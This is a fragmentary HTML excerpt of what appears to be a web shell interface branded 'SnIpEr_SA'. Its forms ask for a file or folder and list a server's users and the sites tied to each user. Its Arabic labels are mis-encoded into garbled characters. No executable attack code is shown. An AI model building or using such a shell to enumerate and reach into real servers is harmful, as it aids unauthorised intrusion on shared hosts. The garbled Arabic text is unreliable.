...
<p align="center" dir="rtl"><font color="#0066FF"><span lang="ar-sa"><b>SnIpEr_SA</b>
 ...
 <form style="border: 4px ridge #FFFFFF">
   <form style="border: 4px ridge #FFFFFF">
     <p align="center">  <b> <td width="50%"><font color=#ffffff>file or folder: «·„·› «Ê «·„Ã·œ «·„ÿ·Ê»</font></td></b></p>
	<p align="center">
...
<form style="border: 4px ridge #FFFFFF">
<td width="50%"><font color=red>users in server:ﬁ«∆„Â «·ÌÊ“—«  »«·”Ì—›—</font></td>
...
<td width="100%" colspan="2">
    <p align="center"><input type="submit" value="Submit"></td>
      ...
      <form style="border: 4px ridge #FFFFFF">
    <td width="50%"><font color=red>name sites with user: ﬁ«∆„Â «·„Ê«ﬁ⁄ „⁄ «”„ ÌÊ“—« Â«</font></td>
